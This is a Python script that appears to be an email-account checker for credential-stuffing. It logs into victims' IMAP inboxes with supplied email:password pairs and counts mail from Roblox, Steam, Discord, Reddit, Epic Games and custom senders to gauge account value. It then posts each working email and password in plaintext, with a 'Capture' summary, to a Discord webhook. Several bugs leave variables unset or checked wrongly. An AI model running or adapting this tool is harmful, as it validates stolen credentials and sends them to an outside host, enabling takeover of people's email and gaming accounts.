import imaplib, requests, json
from email.utils import parsedate_to_datetime

with open('config.json', 'r') as config_file:
    config = json.load(config_file)

with open('custom_checks.json', 'r') as custom_file:
    custom_checks = json.load(custom_file)

# Default Checks
check_roblox = config["default_checks"]["roblox"]
check_steam = config["default_checks"]["steam"]
check_discord = config["default_checks"]["discord"]
check_reddit = config["default_checks"]["reddit"]
check_epicgames = config["default_checks"]["epicgames"]

discord_webhook = config["discord_webhook"]

def inboxmail(email, password):
    # Setup IMAP
    email_parts = email.split('@')
    domain = email_parts[-1]
    
    outlook_domains = ["hotmail.com", "outlook.com", "hotmail.fr", "outlook.fr", "live.com", "live.fr"]
    
    if domain in outlook_domains:
        imap_servers = ['outlook.office365.com']
    else:
        imap_servers = [f'imap.{domain}']
    for imap_server in imap_servers:
        try:
            imap = imaplib.IMAP4_SSL(imap_server, timeout=30)

        except Exception as e:
            continue
        try:
            imap.login(email, password)
            status, messages = imap.select("inbox")
            if status == "OK":
                # Check for Emails
                counts = {}
                if check_roblox == True:
                    result, data = imap.uid("search", None, f'(FROM "noreply@roblox.com")')
                    if result == "OK":
                        counts['Roblox'] = len(data[0].split())
                if check_steam == True:
                    result, data = imap.uid("search", None, f'(FROM "noreply@steampowered.com")')
                    if result == "OK":
                        counts['Steam'] = len(data[0].split())
                if check_discord == True:
                    result, data = imap.uid("search", None, f'(FROM "noreply@discord.com")')
                    if result == "OK":
                        discord_uids = data[0].split()
                        counts['Discord'] = len(discord_uids)
                        if len(discord_uids) > 1:
                            result, data = imap.uid("fetch", discord_uids[0], "(BODY[HEADER.FIELDS (DATE)])")
                            if result == "OK":
                                date_str = data[0][1].decode().strip()
                                email_date = parsedate_to_datetime(date_str)
                                discord_year = email_date.year
                if check_reddit == True:
                    main_result, main_data = imap.uid("search", None, f'(FROM "noreply@reddit.com")')
                    mail_result, mail_data = imap.uid("search", None, f'(FROM "noreply@redditmail.com")')
                    if main_result == "OK" and mail_result == "OK":
                        main_uids = main_data[0].split()
                        mail_uids = mail_data[0].split()
                        counts['Reddit'] = len(main_uids + mail_uids)
                        if len(mail_uids) > 1:
                            result, data = imap.uid("fetch", mail_uids[0], "(BODY[HEADER.FIELDS (DATE)])")
                            if result == "OK":
                                date_str = data[0][1].decode().strip()
                                email_date = parsedate_to_datetime(date_str)
                                reddit_year = email_date.year
                        
                        elif len(main_uids) > 1:
                            result, data = imap.uid("fetch", main_uids[0], "(BODY[HEADER.FIELDS (DATE)])")
                            if result == "OK":
                                date_str = data[0][1].decode().strip()
                                email_date = parsedate_to_datetime(date_str)
                                reddit_year = email_date.year
                if check_epicgames == True:
                    result, data = imap.uid("search", None, f'(FROM "help@accts.epicgames.com")')
                    if result == "OK":
                        counts['Epic Games'] = len(data[0].split())
                
                # Custom Checks
                for check_name, check_info in custom_checks.items():
                    if check_name.lower() == "example_check":
                        continue
                    result, data = imap.uid("search", None, f'(FROM "{check_info["email"]}")')
                    if result == "OK":
                        counts[check_name] = len(data[0].split())

        except Exception as e:
            continue
        # Discord Webhook
        if any(count > 0 for count in counts.values()):
                    message = f"**Valid Mail!**\n{email}:{password}\n\n**Capture:**\n"
                    for service, count in counts.items():
                        if service == 'Reddit' and count > 1 and reddit_year:
                            message += f"{service}: {count} ✅ (Estimated Year: {reddit_year})\n"
                        elif service == 'Discord' and count > 1 and reddit_year:
                            message += f"{service}: {count} ✅ (Estimated Year: {discord_year})\n"
                        elif count > 0:
                            message += f"{service}: {count} ✅\n"
                        else:
                            message += f"{service}: {count}\n"
                    
                    payload = {"content": message}
        requests.post(discord_webhook, data=json.dumps(payload), headers={"Content-Type": "application/json"})
